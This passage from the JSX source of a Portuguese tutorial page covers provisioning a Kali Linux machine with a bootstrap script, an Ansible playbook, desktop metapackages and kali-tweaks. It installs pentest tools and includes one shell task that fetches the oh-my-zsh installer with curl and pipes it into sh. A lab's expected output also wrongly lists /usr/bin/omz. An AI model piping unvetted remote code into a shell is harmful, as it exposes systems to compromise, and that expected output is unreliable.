  log "Clonando dotfiles..."
  git clone --bare "$DOTFILES_REPO" "$USER_HOME/.dotfiles"
  alias dot="/usr/bin/git --git-dir=$USER_HOME/.dotfiles/ --work-tree=$USER_HOME"
  dot checkout -f
  dot config --local status.showUntrackedFiles no
fi

# ─── 9) shell padrão = zsh ─────────────────────────────
if [ "$SHELL" != "/usr/bin/zsh" ]; then
  log "Trocando shell padrão para zsh..."
  chsh -s /usr/bin/zsh
fi

log "Bootstrap completo. Faça logout/login e rode: p10k configure (se quiser refazer prompt)."`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "chmod +x bootstrap.sh && ./bootstrap.sh 2>&1 | tail -20",
            out: `[+] Atualizando sistema...
[+] Instalando pacotes base...
[+] Instalando ferramentas de pentest...
[!] Nerd Font já instalada, pulando.
[!] oh-my-zsh já instalado, pulando.
[+] Instalando LazyVim...
[+] Clonando dotfiles...
Cloning into bare repository '/home/wallyson/.dotfiles'...
[+] Trocando shell padrão para zsh...
Senha:
[+] Bootstrap completo. Faça logout/login e rode: p10k configure (se quiser refazer prompt).`,
            outType: "success",
          },
        ]}
      />

      <h2>10. Ansible — provisionamento declarativo</h2>
      <p>
        Para múltiplas máquinas (sua VM Kali no notebook, outra no desktop, um
        VPS de bastion), Ansible é mais limpo que script bash. Você descreve o
        estado desejado, ele garante.
      </p>

      <CodeBlock
        language="yaml"
        title="kali-setup/playbook.yml"
        code={`---
- name: Provisionar Kali do Wallyson
  hosts: localhost
  connection: local
  become: false
  vars:
    user_home: "{{ ansible_env.HOME }}"
    nerd_font_version: "v3.2.1"

  tasks:
    # ─── pacotes ─────────────────────────────────────────
    - name: Atualizar índice apt
      become: true
      apt:
        update_cache: yes
        cache_valid_time: 3600

    - name: Instalar pacotes base
      become: true
      apt:
        name:
          - zsh
          - tmux
          - neovim
          - git
          - curl
          - ripgrep
          - fd-find
          - fzf
          - jq
          - htop
          - alacritty
          - tilix
          - fonts-firacode
          - fonts-jetbrains-mono
        state: present

    - name: Instalar tools de pentest
      become: true
      apt:
        name: [netexec, impacket-scripts, gobuster, ffuf, seclists, proxychains4, tor]
        state: present

    # ─── oh-my-zsh ───────────────────────────────────────
    - name: Verificar oh-my-zsh
      stat:
        path: "{{ user_home }}/.oh-my-zsh"
      register: omz

    - name: Instalar oh-my-zsh
      shell: |
        sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended --keep-zshrc
      when: not omz.stat.exists

    # ─── powerlevel10k + plugins ────────────────────────
    - name: Clonar powerlevel10k
      git:
        repo: https://github.com/romkatv/powerlevel10k.git
        dest: "{{ user_home }}/.oh-my-zsh/custom/themes/powerlevel10k"
        depth: 1

    - name: Plugins zsh
      git:
        repo: "{{ item.repo }}"
        dest: "{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}"
      loop:
        - { name: zsh-autosuggestions, repo: "https://github.com/zsh-users/zsh-autosuggestions" }
        - { name: zsh-syntax-highlighting, repo: "https://github.com/zsh-users/zsh-syntax-highlighting" }

    # ─── dotfiles ────────────────────────────────────────
    - name: Clonar dotfiles (bare)
      git:
        repo: "git@github.com:wallyson/kali-dotfiles.git"
        dest: "{{ user_home }}/.dotfiles"
        bare: yes

    - name: Aplicar dotfiles
      shell: |
        git --git-dir={{ user_home }}/.dotfiles/ --work-tree={{ user_home }} checkout -f
        git --git-dir={{ user_home }}/.dotfiles/ --work-tree={{ user_home }} config --local status.showUntrackedFiles no

    # ─── shell padrão ────────────────────────────────────
    - name: Trocar shell padrão para zsh
      become: true
      user:
        name: "{{ ansible_env.USER }}"
        shell: /usr/bin/zsh`}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y ansible",
            out: `Setting up ansible (9.5.1+dfsg-1) ...`,
            outType: "muted",
          },
          {
            cmd: "ansible-playbook playbook.yml -K",
            out: `BECOME password:
PLAY [Provisionar Kali do Wallyson] ************************************

TASK [Atualizar índice apt] ********************************************
ok: [localhost]

TASK [Instalar pacotes base] *******************************************
ok: [localhost]

TASK [Instalar tools de pentest] ***************************************
changed: [localhost]

TASK [Verificar oh-my-zsh] *********************************************
ok: [localhost]

TASK [Clonar powerlevel10k] ********************************************
changed: [localhost]

TASK [Plugins zsh] *****************************************************
changed: [localhost] => (item={'name': 'zsh-autosuggestions', ...})
changed: [localhost] => (item={'name': 'zsh-syntax-highlighting', ...})

TASK [Clonar dotfiles (bare)] *****************************************
changed: [localhost]

TASK [Aplicar dotfiles] ***********************************************
changed: [localhost]

TASK [Trocar shell padrão para zsh] ***********************************
changed: [localhost]

PLAY RECAP *************************************************************
localhost  : ok=9  changed=6  unreachable=0  failed=0  skipped=0`,
            outType: "success",
          },
          {
            comment: "rodar de novo == idempotente",
            cmd: "ansible-playbook playbook.yml -K | tail -3",
            out: `PLAY RECAP *************************************************************
localhost  : ok=9  changed=0  unreachable=0  failed=0  skipped=0
            (zero changes — sistema já está como descrito)`,
            outType: "info",
          },
        ]}
      />

      <h2>11. Trocar ambiente gráfico (XFCE → KDE/GNOME)</h2>
      <CommandTable
        title="Meta-pacotes de desktop do Kali"
        variations={[
          { cmd: "kali-desktop-xfce", desc: "XFCE — leve, padrão. Boa performance.", output: "sudo apt install kali-desktop-xfce" },
          { cmd: "kali-desktop-gnome", desc: "GNOME — moderno, polido, pesa mais.", output: "sudo apt install kali-desktop-gnome" },
          { cmd: "kali-desktop-kde", desc: "KDE Plasma — cheio de recursos, parecido com Windows.", output: "sudo apt install kali-desktop-kde" },
          { cmd: "kali-desktop-mate", desc: "MATE — tradicional, fork do GNOME 2. Estável.", output: "sudo apt install kali-desktop-mate" },
          { cmd: "kali-desktop-i3", desc: "i3 tiling — só teclado, para avançados.", output: "sudo apt install kali-desktop-i3" },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y kali-desktop-kde",
            out: `(baixa ~ 1.8 GB)
The following NEW packages will be installed:
  kali-desktop-kde plasma-workspace plasma-desktop sddm konsole dolphin
  [+ 240 outros pacotes]
0 upgraded, 246 newly installed, 0 to remove.
Need to get 1.842 MB of archives.`,
            outType: "warning",
          },
          {
            comment: "ao terminar, escolher display manager (sddm para KDE, lightdm para XFCE)",
            cmd: "sudo dpkg-reconfigure lightdm",
            out: `(menu interativo: escolha entre lightdm | gdm3 | sddm com setas)`,
            outType: "info",
          },
          {
            cmd: "sudo systemctl restart lightdm",
            out: "(você é jogado de volta na tela de login)",
            outType: "muted",
          },
        ]}
      />

      <AlertBox type="warning" title="NUNCA remova o ambiente em uso">
        Se quer remover o XFCE, faça <strong>primeiro</strong> login no novo
        ambiente. Confirme uns dias que o novo está bom. Só então:{" "}
        <code>sudo apt remove --purge kali-desktop-xfce && sudo apt autoremove --purge</code>.
      </AlertBox>

      <h2>12. kali-tweaks — assistente oficial</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo kali-tweaks",
            out: `┌─[ Kali Tweaks ]──────────────────────────────────────┐
│                                                       │
│   1) Metapackages                                     │
│   2) Network Repositories                             │
│   3) Shell & Prompt                                   │
│   4) Hardening                                        │
│   5) Virtualization                                   │
│   6) Powershell                                       │
│   7) Help                                             │
│   8) Quit                                             │
│                                                       │
└───────────────────────────────────────────────────────┘
 [Use ↑↓ para navegar, Enter para escolher]`,
            outType: "info",
          },
          {
            comment: "exemplos do que cada item faz",
            cmd: "# Metapackages → instalar/remover kali-linux-large/everything\n# Hardening   → desabilitar SSH/Postgres/Apache que vêm habilitados\n# Virtualization → drivers VirtualBox/VMware/QEMU guest tools",
            outType: "muted",
          },
        ]}
      />

      <PracticeBox
        title="Lab: do Kali zero ao setup completo em 1 comando"
        goal="Subir uma VM Kali fresca, rodar bootstrap.sh, validar que zsh + p10k + nvim + tmux + dotfiles vieram todos juntos."
        steps={[
          "Instalar Kali fresco em VM (VirtualBox/VMware) — tirar snapshot 'fresh'.",
          "Logar e verificar shell atual: echo $SHELL → provavelmente /usr/bin/zsh sem customização.",
          "Subir o bootstrap.sh para a VM (scp ou colar via clipboard).",
          "Tornar executável e rodar: chmod +x bootstrap.sh && ./bootstrap.sh",
          "Aguardar (~ 8-15 minutos dependendo da internet).",
          "Logout + login (ou exec zsh).",
          "Verificar: prompt powerlevel10k aparece, FiraCode com ícones, tmux com prefixo Ctrl-a, nvim abre LazyVim.",
          "Snapshot 'after-bootstrap' para reverter rápido se mexer demais.",
        ]}
        command={`# na VM Kali fresca:
git clone https://github.com/wallyson/kali-bootstrap
cd kali-bootstrap
chmod +x bootstrap.sh
./bootstrap.sh

# logout/login → conferir
exec zsh
echo $SHELL                     # /usr/bin/zsh
which omz nvim tmux alacritty    # todos /usr/bin/*
fc-list | grep -ic 'nerd font'   # > 0
ls ~/.config/nvim/lua            # estrutura LazyVim
tmux new -s teste -d && tmux ls  # 'teste: 1 windows'`}
        expected={`/usr/bin/zsh
/usr/bin/omz
/usr/bin/nvim
/usr/bin/tmux
/usr/bin/alacritty
14
config.lua  plugins
teste: 1 windows (created Thu Apr  4 09:42:11 2026)`}
        verify="Abra Alacritty/Tilix com fonte 'FiraCode Nerd Font Mono' — o prompt deve mostrar ícones (cabeça de cobra, branch git, raio de bateria). Se mostrar quadradinhos, a fonte do terminal está errada — ajuste em Preferences."
      />

      <AlertBox type="info" title="Customização é OPSEC também">
        Dois pontos finos: (1) deixe um <strong>perfil "limpo"</strong> com
        prompt padrão para gravar vídeo/screenshot de cliente — o seu prompt
        custom revela seu username e talvez hostname. (2) Em engagement, evite
        sincronizar dotfiles via git público se eles tiverem aliases que
        revelem seus alvos (ex.: <code>alias htb-vpn='openvpn cliente_x.ovpn'</code>).
      </AlertBox>
    </PageContainer>
  );
}
